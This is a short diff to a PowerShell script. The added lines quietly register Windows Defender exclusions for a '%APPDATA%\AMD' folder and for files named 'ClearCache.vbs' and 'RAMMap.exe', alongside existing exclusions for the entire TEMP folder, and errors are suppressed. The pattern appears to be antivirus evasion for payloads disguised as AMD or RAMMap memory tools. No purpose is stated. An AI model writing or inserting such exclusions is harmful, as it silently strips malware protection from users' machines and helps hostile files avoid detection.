@@ -40,6 +40,8 @@ try {
 try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:APPDATA\AMD" -ExclusionProcess "RAMMap.txt" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:APPDATA\AMD" -ExclusionProcess "ClearCache.vbs" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:APPDATA\AMD" -ExclusionProcess "RAMMap.exe" -ErrorAction SilentlyContinue
 
 } catch {
     #Write-Output "Error: Unable to add exclusions to Windows Defender."
